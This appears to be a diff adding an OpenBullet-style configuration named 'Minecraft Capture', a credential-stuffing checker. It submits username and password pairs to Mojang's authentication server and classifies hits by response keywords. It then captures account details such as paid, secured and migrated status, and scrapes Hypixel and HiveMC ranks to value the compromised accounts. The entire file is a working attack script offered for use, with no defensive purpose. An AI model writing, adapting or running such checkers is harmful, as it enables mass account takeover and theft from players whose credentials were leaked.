@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "Minecraft Capture",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-24T14:12:38.3890857-04:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"<USER>\",\"password\":\"<PASS>\",\"requestUser\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"}" 
+  KEYCHAIN Success OR 
+    KEY "accessToken\":\"" 
+    KEY "passwordChangedAt\":" 
+
+#Capture_Name PARSE "<SOURCE>" LR "name\":\"" "\",\"userId" -> CAP "Username" 
+
+#Capture_paid PARSE "<SOURCE>" LR ",\"paid\":" ",\"migrated" -> CAP "Paid" 
+
+#legacyProfile PARSE "<SOURCE>" LR "\"legacyProfile\":" ",\"suspend" -> CAP "Legacy" 
+
+#Capture_Secured PARSE "<SOURCE>" LR "secured\":" ",\"migrated" -> CAP "Secured" 
+
+#Capture_Migrated PARSE "<SOURCE>" LR ",\"migrated\":" "}," -> CAP "Migrated" 
+
+#Get_Capture_Rank_Hypixel REQUEST GET "https://hypixel.net/player/<Name>/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture_Abo_Hypixel_ PARSE "<SOURCE>" LR "rank-badge rank-badge-mvp_plus\">" "</span" -> CAP "Rank Hypixel" 
+
+#Get_HiveMC REQUEST GET "https://hivemc.com/player/<Name>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "class=\"rank emerald\">" "</p>" -> CAP "HiveMC Rank" 
+
